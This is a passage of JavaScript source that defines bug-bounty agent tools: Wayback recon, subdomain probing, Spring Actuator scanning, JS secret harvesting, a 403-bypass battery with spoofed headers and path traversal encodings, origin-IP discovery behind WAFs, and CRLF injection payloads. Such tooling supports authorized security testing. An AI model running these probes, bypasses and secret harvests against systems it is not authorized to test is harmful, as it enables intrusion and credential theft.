			const out = await techDetect(url, exec);
			return { url, status: out.status, tech: out.tech, error: out.error };
		}
	},
	{
		name: "bb_wayback_urls",
		description: "Pull archived URLs for a domain from the Wayback CDX API (2xx/3xx snapshots). Flags interesting endpoints (api, admin, upload, .env, .git, swagger) and interesting params (id, file, redirect, token, auth, download, cmd).",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain to query, e.g. example.com" },
				limit: { type: "integer", description: "Max archived URLs to fetch (default 300, cap 2000)" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					urls: { type: "array", items: { type: "string" } },
					count: { type: "integer" },
					interesting: { type: "array", items: { type: "object", properties: { url: { type: "string" }, reason: { type: "string" } } } },
					error: { type: "string" }
				},
				required: ["domain", "urls", "count", "interesting", "error"]
			},
			render: (_args, v) => renderLines(`📚 bb_wayback_urls ${v.domain}`, [
				`urls: ${v.count}${v.error ? ` — error: ${v.error}` : ""}`,
				...(v.interesting.length ? [`interesting (${v.interesting.length}):`, ...v.interesting.map((i) => `  ⚠ ${i.url}  (${i.reason})`)] : []),
				...(v.urls.length > 50 ? ["  ..."] : []),
				...(v.urls.slice(0, 50).map((u) => `  - ${u}`))
			])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const domain = normalizeDomain(String(args.domain ?? ""));
			if (!DOMAIN_RE.test(domain)) throw new Error(`invalid domain: "${domain}" — use a bare hostname like example.com`);
			const limit = Math.min(Math.max(Number(args.limit ?? 300) || 300, 10), 2000);
			const out = { domain, urls: [], count: 0, interesting: [], error: "" };
			try {
				const cd = `https://web.archive.org/cdx/search/cdx?url=${encodeURIComponent(domain)}/*&output=json&fl=timestamp,original,statuscode,mimetype&collapse=urlkey&limit=${limit}`;
				const { res, text } = await fetchText(cd, exec, { budget: 45000 });
				if (!res.ok) throw new Error(`CDX HTTP ${res.status}`);
				const rows = JSON.parse(text);
				if (!Array.isArray(rows) || rows.length < 2) return out;
				const seen = new Set();
				const urls = [];
				const interesting = [];
				for (const row of rows.slice(1)) {
					const original = String(row[1] || "");
					const st = String(row[2] || "");
					if (st && !/^[23]/.test(st)) continue;
					if (!original || seen.has(original)) continue;
					seen.add(original);
					urls.push(original);
					const reason = interestingReason(original);
					if (reason && interesting.length < 200) interesting.push({ url: original, reason });
				}
				out.urls = urls.slice(0, limit);
				out.count = urls.length;
				out.interesting = interesting;
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_recon",
		description: "One-shot recon pipeline for a domain: passive subdomain enumeration, HTTP(S) probing, tech fingerprinting and security-header audit of top live hosts. Returns live hosts, findings (missing headers, header leaks, cookie flags, http-only hosts) and warnings.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { domain: { type: "string", description: "Root domain, e.g. example.com" } },
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					subdomains: { type: "array", items: { type: "string" } },
					subdomainCount: { type: "integer" },
					liveHosts: {
						type: "array",
						items: {
							type: "object",
							properties: {
								host: { type: "string" },
								url: { type: "string" },
								status: { type: "integer" },
								server: { type: "string" },
								title: { type: "string" },
								tech: { type: "array", items: { type: "string" } }
							}
						}
					},
					findings: { type: "array", items: { type: "object", properties: { type: { type: "string" }, target: { type: "string" }, detail: { type: "string" } } } },
					warnings: { type: "array", items: { type: "string" } },
					durationMs: { type: "integer" }
				},
				required: ["domain", "subdomains", "subdomainCount", "liveHosts", "findings", "warnings", "durationMs"]
			},
			render: (_args, v) => {
				const lines = [
					`subdomains: ${v.subdomainCount} (showing ${v.subdomains.length})`,
					`live hosts: ${v.liveHosts.length}`,
					...(v.liveHosts.length ? ["", ...v.liveHosts.map((h) => `  ● ${h.host} (${h.status})${h.server ? ` [${h.server}]` : ""}${h.title ? ` — ${h.title}` : ""}${h.tech.length ? ` tech: ${h.tech.join(", ")}` : ""}`)] : []),
					...(v.findings.length ? ["", `findings (${v.findings.length}):`, ...v.findings.map((f) => `  ⚠ ${f.type} ${f.target} — ${f.detail}`)] : []),
					...(v.warnings.length ? ["", `warnings:`].concat(v.warnings.map((w) => `  ! ${w}`)) : []),
					`duration: ${v.durationMs}ms`
				];
				return renderLines(`🎯 bb_recon ${v.domain}`, lines);
			}
		},
		timeoutMs: 120000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const domain = normalizeDomain(String(args.domain ?? ""));
			if (!DOMAIN_RE.test(domain)) throw new Error(`invalid domain: "${domain}" — use a bare hostname like example.com`);
			const start = Date.now();
			const warnings = [];
			const { subdomains, errors } = await enumSubdomains(domain, exec, 300);
			warnings.push(...errors.slice(0, 5));
			const candidates = uniq([domain, ...subdomains]);
			candidates.sort((a, b) => a.length - b.length || a.localeCompare(b));
			const picked = candidates.slice(0, 20);
			if (picked.length === 0) {
				return { domain, subdomains: [], subdomainCount: 0, liveHosts: [], findings: [], warnings: warnings.slice(0, 20), durationMs: Date.now() - start };
			}
			const attempts = [];
			for (const host of picked) {
				for (const scheme of ["http", "https"]) {
					for (const port of [80, 443]) attempts.push({ host, scheme, port });
				}
			}
			const probeResults = await mapPool(attempts, 8, (a) => probeOnce(a.host, a.scheme, a.port, exec));
			const byHost = new Map();
			for (let i = 0; i < attempts.length; i++) {
				const a = attempts[i];
				if (!byHost.has(a.host)) byHost.set(a.host, []);
				byHost.get(a.host).push(probeResults[i]);
			}
			const liveHosts = [];
			const findings = [];
			for (const host of picked) {
				const rs = byHost.get(host) || [];
				const live = rs.filter((r) => r.ok && r.status >= 200 && r.status < 400);
				if (live.length === 0) continue;
				const best = live.find((r) => r.scheme === "https" && r.port === 443) || live.find((r) => r.scheme === "https") || live[0];
				liveHosts.push({ host, url: best.url, status: best.status, server: best.server, title: best.title, tech: [] });
				const httpOk = live.some((r) => r.scheme === "http");
				const httpsOk = live.some((r) => r.scheme === "https");
				if (httpOk && !httpsOk) findings.push({ type: "http-only", target: host, detail: "reachable over http but not https" });
			}
			liveHosts.sort((a, b) => a.host.length - b.host.length || a.host.localeCompare(b.host));
			const techJobs = liveHosts.slice(0, 10).map((h) => ({ host: h.host, url: h.url }));
			const techResults = await mapPool(techJobs, 4, async ({ host, url }) => {
				const t = await techDetect(url, exec);
				return { host, tech: t.tech.map((x) => x.name), error: t.error };
			});
			const headJobs = liveHosts.slice(0, 6).map((h) => ({ host: h.host, url: h.url }));
			const headResults = await mapPool(headJobs, 4, async ({ host, url }) => {
				const s = await securityHeaders(url, exec);
				return { host, s };
			});
			for (const t of techResults) {
				const lh = liveHosts.find((x) => x.host === t.host);
				if (lh) lh.tech = t.tech;
				if (t.error) warnings.push(`${t.host} tech: ${t.error}`);
			}
			for (const hr of headResults) {
				const s = hr.s;
				if (s.error) { warnings.push(`${hr.host} headers: ${s.error}`); continue; }
				for (const m of s.missing) findings.push({ type: "missing-header", target: hr.host, detail: m });
				for (const l of s.leaks) findings.push({ type: "header-leak", target: hr.host, detail: `${l.name}: ${l.value}` });
				for (const c of s.cookieFlags) if (c.missing.length) findings.push({ type: "cookie-flag", target: hr.host, detail: `${c.name} missing ${c.missing.join(",")}` });
			}
			return {
				domain,
				subdomains: subdomains.slice(0, 100),
				subdomainCount: subdomains.length,
				liveHosts: liveHosts.slice(0, 25),
				findings: findings.slice(0, 80),
				warnings: warnings.slice(0, 20),
				durationMs: Date.now() - start
			};
		}
	},
	{
		name: "bb_checklist",
		description: "Bug bounty methodology checklist (45 categories: recon, IDOR/BAC, SSRF, auth, XSS, SQLi, business logic, API misconfig, subdomain takeover, CSRF/open redirect, file upload, engagement, reporting, registration-flows, actuator, js-recon, origin-ip, crlf-injection, host-header, rate-limit, 403-bypass, email-field, mass-assignment, punycode-idn, blind-xss, waf-bypass, framework-cves, github-recon, iis-fuzzing, nuclei-dast, s3-recon, swagger-api, wayback-mining, fuzz-pipeline, sqli-recon, open-redirect, cache-deception, wordpress, ct-monitor, url-collection, sensitive-data, lfi, cors, google-dorks). For source-code audit use bb_source_audit(language?). Unfiltered returns a compact index; pass a category slug/name for full checks and techniques.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { category: { type: "string", description: "Optional slug or name substring, e.g. \"ssrf\", \"api\", \"reporting\"" } },
			required: []
		},
		output: {
			schema: {
				type: "object",
				properties: {
					categories: {
						type: "array",
						items: {
							type: "object",
							properties: {
								slug: { type: "string" },
								name: { type: "string" },
								description: { type: "string" },
								checks: { type: "array", items: { type: "string" } },
								techniques: { type: "array", items: { type: "string" } }
							}
						}
					},
					count: { type: "integer" },
					filtered: { type: "boolean" }
				},
				required: ["categories", "count", "filtered"]
			},
			render: (_args, v) => v.filtered
				? renderLines("📋 bb_checklist", v.categories.flatMap((c) => [
					`\n## ${c.name} (${c.slug})`,
					c.description,
					`  checks:`,
					...c.checks.map((x) => `    - ${x}`),
					`  techniques: ${c.techniques.join(", ")}`
				]))
				: renderLines(`📋 bb_checklist — ${v.count} categories`, [
					`pass a category slug or name for full checks + techniques, e.g. bb_checklist(category="ssrf")`,
					...v.categories.map((c) => `  ${c.slug} — ${c.name}`)
				]),
		},
		timeoutMs: 5000,
		isConcurrencySafe: () => true,
		async execute(args) {
			const cat = String(args.category ?? "").trim().toLowerCase();
			const categories = cat ? CHECKLIST.filter((c) => c.slug.includes(cat) || c.name.toLowerCase().includes(cat)) : CHECKLIST;
			return { categories, count: categories.length, filtered: cat !== "" };
		}
	},
	{
		name: "bb_source_audit",
		description: "Source-code audit methodology (segregated from web bug bounty): 7-step audit flow, bug-class priority order, and per-language checklists + grep patterns for C/C++, Rust, Go, JS/TS. Optional language filter returns just that language's focused checks.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: { language: { type: "string", description: "Optional slug to focus: \"c\", \"cpp\", \"rust\", \"go\", \"js\", \"ts\"" } },
			required: []
		},
		output: {
			schema: {
				type: "object",
				properties: {
					methodology: { type: "array", items: { type: "string" } },
					priority: { type: "array", items: { type: "string" } },
					languages: {
						type: "array",
						items: {
							type: "object",
							properties: {
								slug: { type: "string" },
								name: { type: "string" },
								checks: { type: "array", items: { type: "string" } },
								grep: { type: "array", items: { type: "string" } }
							}
						}
					},
					count: { type: "integer" },
					filtered: { type: "boolean" }
				},
				required: ["methodology", "priority", "languages", "count", "filtered"]
			},
			render: (_args, v) => v.filtered
				? renderLines("🧬 bb_source_audit", [
					`focus: ${v.languages[0].name} (${v.languages[0].slug})`,
					`  checks:`,
					...v.languages[0].checks.map((x) => `    - ${x}`),
					`  grep patterns: ${v.languages[0].grep.join(" | ")}`
				])
				: renderLines("🧬 bb_source_audit — source-code audit", [
					`pass a language slug (c, cpp, rust, go, js, ts) for focused checks, e.g. bb_source_audit(language="rust")`,
					`methodology:`,
					...v.methodology.map((x) => `  ${x}`),
					`priority order:`,
					...v.priority.map((x) => `  ${x}`),
					`languages:`,
					...v.languages.map((l) => `  ${l.slug} — ${l.name} (grep: ${l.grep.join(", ")})`)
				]),
		},
		timeoutMs: 5000,
		isConcurrencySafe: () => true,
		async execute(args) {
			const lang = String(args.language ?? "").trim().toLowerCase();
			const languages = lang
				? SOURCE_AUDIT.languages.filter((l) => l.slug.includes(lang) || l.name.toLowerCase().includes(lang))
				: SOURCE_AUDIT.languages;
			return { methodology: SOURCE_AUDIT.methodology, priority: SOURCE_AUDIT.priority, languages, count: languages.length, filtered: lang !== "" };
		}
	},
	{
		name: "bb_triage",
		description: "Rhat-scored bug triage & campaign workflow (merged from the bughunt obsidian bug-report template + FINDINGS/SOL lessons): score a candidate with P(real_bug)/P(feasible)/P(reproducible)/P(new_root_cause)/expected_impact -> REPORT / INVESTIGATE / DISCARD verdict, status-tracking flow, finding classes (separating genuine bugs from design opinions), SQLite concurrency audit checklist, and the report template fields.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {},
			required: []
		},
		output: {
			schema: {
				type: "object",
				properties: {
					rubric: { type: "array", items: { type: "string" } },
					verdicts: { type: "array", items: { type: "string" } },
					status_flow: { type: "array", items: { type: "string" } },
					finding_classes: { type: "array", items: { type: "string" } },
					sqlite_audit: { type: "array", items: { type: "string" } },
					report_template: { type: "array", items: { type: "string" } },
					count: { type: "integer" },
					filtered: { type: "boolean" }
				},
				required: ["rubric", "verdicts", "status_flow", "finding_classes", "sqlite_audit", "report_template", "count", "filtered"]
			},
			render: (_args, v) => renderLines("⚖️ bb_triage — Rhat-scored bug triage", [
				"score a candidate before reporting (bughunt bug-report template):",
				...v.rubric.map((x) => `  ${x}`),
				`verdicts: ${v.verdicts.join(" | ")}`,
				`status flow: ${v.status_flow.join(" -> ")}`,
				`finding classes (FINDINGS.md): ${v.finding_classes.join(", ")}`,
				"sqlite concurrency audit (FINDINGS.md 'one thing I'd add'):",
				...v.sqlite_audit.map((x) => `  - ${x}`),
				`report template fields: ${v.report_template.join(", ")}`
			]),
		},
		timeoutMs: 5000,
		isConcurrencySafe: () => true,
		async execute() {
			return { ...TRIAGE, count: TRIAGE.rubric.length, filtered: false };
		}
	},
{
		name: "bb_actuator_scan",
		description: "Probe a URL for exposed Spring Boot Actuator endpoints (full endpoint set, ACL-bypass headers, path mutations). Returns found/high-risk endpoints with status and content-type. Keyless: direct HTTP only.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				url: { type: "string", description: "Base URL to scan, e.g. https://target.com" }
			},
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					checked: { type: "integer" },
					endpoints: { type: "array", items: { type: "object", properties: { path: { type: "string" }, status: { type: "integer" }, ctype: { type: "string" }, size: { type: "integer" }, flag: { type: "string" } }, required: ["path", "status", "ctype", "size", "flag"], additionalProperties: false } },
					highRisk: { type: "array", items: { type: "string" } }
				},
				required: ["url", "checked", "endpoints", "highRisk"],
			},
			render: (_args, v) =>
				renderLines("bb_actuator_scan", [
					"target: " + v.url,
					"probed " + v.checked + " endpoint/path variants",
					"high-risk hits: " + (v.highRisk.length ? v.highRisk.join(", ") : "none"),
					...v.endpoints.map((e) => (e.flag === "high" ? "[HIGH] " : "[hit]  ") + e.path + " -> " + e.status + " (" + (e.ctype || "-") + ", " + e.size + "B)"),
				])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), checked: 0, endpoints: [], highRisk: [] };
			try {
				const base = normalizeUrl(args.url);
				const basePath = (() => { try { return new URL(base).pathname.replace(/\/$/, ""); } catch { return ""; } })();
				const host = (() => { try { return new URL(base).host; } catch { return ""; } })();
				const paths = [
					"/actuator", "/actuator/env", "/actuator/env/{property}", "/actuator/health",
					"/actuator/info", "/actuator/configprops", "/actuator/beans", "/actuator/mappings",
					"/actuator/metrics", "/actuator/loggers", "/actuator/threaddump", "/actuator/heapdump",
					"/actuator/jolokia", "/actuator/hawtio", "/actuator/httptrace", "/actuator/auditevents",
					"/actuator/sessions", "/actuator/shutdown", "/actuator/prometheus", "/actuator/conditions",
					"/actuator/refresh", "/actuator/restart", "/env", "/heapdump", "/jolokia", "/metrics", "/trace",
					"/dump", "/actuator/gateway/routes", "/actuator/caches", "/actuator/flyway", "/actuator/liquibase",
				];
				const mutations = [
					";/actuator", ";//actuator//", "/%2e%2e/actuator", "/actuator;", "/actuator;.js",
					"/actuator/.", "/actuator/..;/", "/actuator%2f", "/actuator%00", "/actuator.json",
					"/actuator?path=env", "//actuator//", "/actuator/env", "/actuator;/env", "/actuator%3Fenv", "/;jsessionid=x/actuator",
				];
				const highRe = /(heapdump|env|shutdown|jolokia|loggers|gateway|restart|refresh|sessions|auditevents|configprops|threaddump|httptrace|prometheus|flyway|liquibase|mappings)/;
				const seen = new Set();
				const probe = async (path) => {
					const p = basePath + path;
					const full = host + p;
					if (seen.has(full)) return;
					seen.add(full);
					const r = await fetchWithHeader(
						base.replace(/\/$/, "") + p,
						exec,
						"x-forwarded-for",
						"127.0.0.1"
					);
					out.checked++;
					const hit = r.status >= 200 && r.status < 400 || r.status === 401 || r.status === 403;
					let flag = "";
					if (hit) {
						flag = (r.status < 400 && highRe.test(path)) ? "high" : "found";
						if (flag === "high") out.highRisk.push(path);
					}
					if (hit) out.endpoints.push({ path, status: r.status, ctype: r.ctype, size: r.size, flag });
				};
				for (const p of paths) await probe(p);
				await mapPool(mutations, 6, (p) => probe(p));
				out.endpoints.sort((a, b) => (a.flag === "high" ? -1 : 1) - (b.flag === "high" ? -1 : 1));
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_js_secrets",
		description: "Harvest a domain's JS files from Wayback CDX and scan for secrets/keys (AWS, Google, JWTs, api_key, token, password, secret). Keyless: CDX + direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain to harvest JS from, e.g. example.com" },
				limit: { type: "integer", description: "Max JS files to scan (default 25)" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					count: { type: "integer" },
					urls: { type: "array", items: { type: "object", properties: { url: { type: "string" }, found: { type: "array", items: { type: "string" } } }, required: ["url", "found"], additionalProperties: false } },
					note: { type: "string" }
				},
				required: ["domain", "count", "urls", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_js_secrets", [
					"domain: " + v.domain,
					"scanned " + v.count + " JS files",
					...(v.urls.length ? v.urls.map((u) => "[" + u.found.join(",") + "] " + u.url) : ["no secrets matched"]),
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { domain: String(args.domain || ""), count: 0, urls: [], note: "" };
			try {
				const domain = normalizeDomain(args.domain);
				const { urls, error } = await cdxUrls(domain, exec, { filterJs: true, cap: Math.min(parseInt(args.limit || 25, 10), 80) });
				if (error && !urls.length) out.note = "CDX error: " + error;
				const patterns = [
					{ name: "aws_key", re: /AKIA[0-9A-Z]{16}/g },
					{ name: "google_key", re: /AIza[0-9A-Za-z_-]{35}/g },
					{ name: "jwt", re: /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g },
					{ name: "generic_key", re: /\b(api[_-]?key|api_key|secret|token|password|passwd|pwd|client_secret|private_key)\b\s*[:=]\s*["'][^"']{8,}["']/gi },
				];
				await mapPool(urls, 4, async (u) => {
					try {
						const { res } = await fetchRes(u, exec, { budget: 45000 });
						const txt = await readLimited(res, 500_000);
						out.count++;
						const found = [];
						for (const p of patterns) {
							const m = (txt.match(p.re) || []).slice(0, 8);
							if (m.length) {
								found.push(p.name);
								break;
							}
						}
						if (found.length) out.urls.push({ url: u, found });
					} catch {
						// individual fetch failure skipped
					}
				});
				out.urls = out.urls.slice(0, 60);
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_403_bypass",
		description: "Bypass battery for a 403/restricted URL: alternate methods, routing headers (X-Original-URL, X-Forwarded-For, X-Custom-IP-Authorization...), encoded traversals, path mutations, slash/semicolon/query variants. Returns status changes vs baseline. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				url: { type: "string", description: "Full URL that returns 403, e.g. https://target.com/admin" }
			},
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					baseline: { type: "integer" },
					methods: { type: "array", items: { type: "object", properties: { value: { type: "string" }, status: { type: "integer" } }, required: ["value", "status"], additionalProperties: false } },
					headers: { type: "array", items: { type: "object", properties: { value: { type: "string" }, status: { type: "integer" } }, required: ["value", "status"], additionalProperties: false } },
					paths: { type: "array", items: { type: "object", properties: { value: { type: "string" }, status: { type: "integer" } }, required: ["value", "status"], additionalProperties: false } },
					changes: { type: "array", items: { type: "object", properties: { kind: { type: "string" }, value: { type: "string" }, status: { type: "integer" } }, required: ["kind", "value", "status"], additionalProperties: false } }
				},
				required: ["url", "baseline", "methods", "headers", "paths", "changes"],
			},
			render: (_args, v) =>
				renderLines("bb_403_bypass", [
					"target: " + v.url + " (baseline " + v.baseline + ")",
					"changes: " + (v.changes.length ? v.changes.map((c) => c.kind + "=" + c.value + "->" + c.status).join(" | ") : "none"),
				])
		},
		timeoutMs: 60000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), baseline: 0, methods: [], headers: [], paths: [], changes: [] };
			try {
				const base = normalizeUrl(args.url);
				const u = new URL(base);
				const path = u.pathname;
				const host = u.host;
				const origin = u.origin;
				const get = async (url, headers) => {
					try {
						const { res } = await fetchRes(url, exec, { budget: 10000, headers: headers || { "user-agent": UA } });
						await readLimited(res, 200);
						return res.status;
					} catch {
						return 0;
					}
				};
				out.baseline = await get(base);
				const methods = ["POST", "PUT", "HEAD", "PATCH", "TRACE", "OPTIONS", "DELETE", "SEARCH", "PROPFIND"];
				for (const m of methods) {
					try {
						const b = withBudget(exec, 10000);
						let status = 0;
						try {
							const r = await fetch(base, { method: m, signal: b.signal, redirect: "manual", headers: { "user-agent": UA, "x-forwarded-for": "127.0.0.1" } });
							status = r.status;
							await readLimited(r, 200);
						} finally {
							b.dispose();
						}
						out.methods.push({ value: m, status });
					} catch {
						out.methods.push({ value: m, status: 0 });
					}
				}
				const hdrTests = [
					["x-original-url", path],
					["x-rewrite-url", path],
					["x-forwarded-for", "127.0.0.1"],
					["x-real-ip", "127.0.0.1"],
					["x-forwarded-host", host],
					["x-custom-ip-authorization", "127.0.0.1"],
					["x-client-ip", "127.0.0.1"],
					["x-host", host],
					["referer", origin + "/"],
				];
				for (const [h, val] of hdrTests) {
					const s = await get(base, { "user-agent": UA, [h]: val });
					out.headers.push({ value: h + ": " + val, status: s });
				}
				const pathTests = [
					path + "/", path + "//", path + "/.", path + "/./", path + "..;/", path + ";",
					path + ";.js", "/" + path.replace(/^\//, "") + "/", "/" + encodeURI(path.replace(/^\//, "")), path + "%2e",
					path + "%2f", path + "%00", path + "?", path + "?x=1", path + "#x", path + "..%2f",
					"/%2e%2e" + path, "/%252e%252e" + path, "/%c0%af" + path, path + ".json",
				];
				for (const p of pathTests) {
					const u2 = new URL(u.origin + p);
					const s = await get(u2.toString());
					out.paths.push({ value: p, status: s });
				}
				await mapPool(out.methods, 6, async () => {});
				const interesting = (s) => s > 0 && s < 500 && s !== out.baseline;
				for (const m of out.methods) if (interesting(m.status)) out.changes.push({ kind: "method", value: m.value, status: m.status });
				for (const h of out.headers) if (interesting(h.status)) out.changes.push({ kind: "header", value: h.value, status: h.status });
				for (const p of out.paths) if (interesting(p.status)) out.changes.push({ kind: "path", value: p.value, status: p.status });
				out.changes = out.changes.slice(0, 40);
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_origin_ip",
		description: "Origin IP recon behind a WAF: SPF TXT chain (ip4/ip6/include via DoH), OTX-hostname cross-check, optional direct-IP title probing. Keyless: DoH + OTX + direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain behind a WAF/CDN, e.g. example.com" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					spfIps: { type: "array", items: { type: "string" } },
					spfIncludes: { type: "array", items: { type: "string" } },
					otxHosts: { type: "array", items: { type: "string" } },
					probes: { type: "array", items: { type: "object", properties: { host: { type: "string" }, status: { type: "integer" }, title: { type: "string" } }, required: ["host", "status", "title"], additionalProperties: false } },
					note: { type: "string" }
				},
				required: ["domain", "spfIps", "spfIncludes", "otxHosts", "probes", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_origin_ip", [
					"domain: " + v.domain,
					"SPF ips: " + (v.spfIps.length ? v.spfIps.join(", ") : "none"),
					"SPF includes: " + (v.spfIncludes.length ? v.spfIncludes.join(", ") : "none"),
					"OTX hosts: " + (v.otxHosts.length ? v.otxHosts.slice(0, 12).join(", ") : "none"),
					...v.probes.map((p) => "probe " + p.host + " -> " + p.status + " " + (p.title || "")),
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 45000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { domain: String(args.domain || ""), spfIps: [], spfIncludes: [], otxHosts: [], probes: [], note: "" };
			try {
				const domain = normalizeDomain(args.domain);
				const spf = await spfTxt(domain, exec);
				out.spfIps = spf.ips.slice(0, 25);
				out.spfIncludes = spf.includes.slice(0, 12);
				const otx = await otxUrls(domain, exec, 150);
				out.otxHosts = otx.hosts.slice(0, 30);
				if (spf.error) out.note = "SPF error: " + spf.error;
				if (otx.error) out.note += (out.note ? "; OTX error: " : "OTX error: ") + otx.error;
				const candidates = out.spfIps.slice(0, 10);
				const results = await mapPool(candidates, 4, (ip) => probeTitle(ip, exec));
				for (const r of results) if (r) out.probes.push({ host: r.host, status: r.status, title: r.title });
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_crlf_scan",
		description: "CRLF injection scan on a URL: inject %0d%0a / %0a / GBK-encoded variants into path and query, detect injected Set-Cookie/Location headers in the response. Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				url: { type: "string", description: "URL whose path/params reflect input, e.g. https://example.com/redirect?url=" }
			},
			required: ["url"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					url: { type: "string" },
					count: { type: "integer" },
					found: { type: "array", items: { type: "object", properties: { where: { type: "string" }, payload: { type: "string" }, header: { type: "string" }, status: { type: "integer" } }, required: ["where", "payload", "header", "status"], additionalProperties: false } },
					note: { type: "string" }
				},
				required: ["url", "count", "found", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_crlf_scan", [
					"target: " + v.url,
					"tested " + v.count + " injection points",
					v.found.length ? v.found.map((f) => "[FOUND] " + f.where + ": " + f.payload + " -> " + f.header) : "no CRLF headers injected",
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 45000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { url: String(args.url || ""), count: 0, found: [], note: "" };
			try {
				const base = normalizeUrl(args.url);
				const payloads = [
					["%0d%0a", "set-cookie: crlf=coffinxp; path=/"],
					["%0a", "x-injected: coffinxp"],
					["%00%0d%0a", "set-cookie: crlf=coffinxp2; path=/"],
					["%0d%0aSet-Cookie:crlf=px;", ""],
					["\u00e5\u0098\u008d\u00e5\u0098\u008a", "set-cookie: crlf=gbk; path=/"],
				];
				const variants = [];
				const u = new URL(base);
				const basePath = u.pathname.replace(/\/$/, "");
				for (const [cr, hdr] of payloads) {
					variants.push({ where: "path", payload: cr + hdr, url: base.replace(basePath, basePath + "/" + cr + hdr) });
					if (u.search) {
						variants.push({ where: "query", payload: cr + hdr, url: base + "&x=" + cr + hdr });
					} else {
						variants.push({ where: "query", payload: cr + hdr, url: base + "?x=" + cr + hdr });
					}
					if (hdr) {
						variants.push({ where: "path-header", payload: cr + hdr, url: base.replace(basePath, basePath + cr + hdr) });
					}
				}
				const seen = new Set();
				for (const v of variants) {
					if (seen.has(v.url)) continue;
					seen.add(v.url);
					out.count++;
					try {
						const { res } = await fetchRes(v.url, exec, { budget: 10000 });
						await readLimited(res, 400);
						const injected = [];
						const sc = res.headers.get("set-cookie");
						if (sc && /crlf=|coffinxp/.test(sc)) injected.push("Set-Cookie: " + sc);
						if (res.headers.get("x-injected")) injected.push("X-Injected: " + res.headers.get("x-injected"));
						if (injected.length) out.found.push({ where: v.where, payload: v.payload, header: injected.join(" | "), status: res.status });
					} catch {
						// skipped
					}
				}
				out.found = out.found.slice(0, 20);
			} catch (e) {
				out.error = shortErr(e);
			}
			return out;
		}
	},
	{
		name: "bb_swagger_scan",
		description: "Probe a domain for exposed Swagger/OpenAPI documentation paths (swagger-ui, api-docs, openapi.json/yaml, swagger-resources...). Keyless: direct HTTP.",
		parameters: {
			type: "object",
			additionalProperties: false,
			properties: {
				domain: { type: "string", description: "Domain to scan, e.g. example.com" }
			},
			required: ["domain"]
		},
		output: {
			schema: {
				type: "object",
				properties: {
					domain: { type: "string" },
					endpoints: { type: "array", items: { type: "object", properties: { path: { type: "string" }, status: { type: "integer" }, ctype: { type: "string" }, size: { type: "integer" } }, required: ["path", "status", "ctype", "size"], additionalProperties: false } },
					found: { type: "integer" },
					note: { type: "string" }
				},
				required: ["domain", "endpoints", "found", "note"],
			},
			render: (_args, v) =>
				renderLines("bb_swagger_scan", [
					"domain: " + v.domain,
					"found " + v.found + " swagger/openapi docs",
					...v.endpoints.map((e) => e.path + " -> " + e.status + " (" + (e.ctype || "-") + ", " + e.size + "B)"),
					v.note ? "note: " + v.note : "",
				])
		},
		timeoutMs: 45000,
		isConcurrencySafe: () => true,
		async execute(args, exec) {
			const out = { domain: String(args.domain || ""), endpoints: [], found: 0, note: "" };
			try {
				const domain = normalizeDomain(args.domain);
				const paths = [
					"/swagger-ui.html", "/swagger-ui/index.html", "/swagger-ui/", "/swagger/index.html", "/swagger",
					"/api-docs", "/v2/api-docs", "/v3/api-docs", "/openapi.json", "/openapi.yaml", "/openapi.yml",
					"/swagger.json", "/api/swagger.json", "/api/swagger-ui.html", "/api/swagger-ui/", "/swagger-resources",
					"/docs", "/documentation", "/api/docs", "/swagger-ui/dist/", "/apis/swagger", "/v1/api-docs",
				];
				await mapPool(paths, 8, async (p) => {
					try {
						const { res } = await fetchRes("https://" + domain + p, exec, { budget: 12000 });
						const body = await readLimited(res, 3000);
						out.endpoints.push({ path: p, status: res.status, ctype: res.headers.get("content-type") || "", size: body.length });
					} catch {
						out.endpoints.push({ path: p, status: 0, ctype: "", size: 0 });
					}
				});
				out.endpoints.sort((a, b) => a.status - b.status);
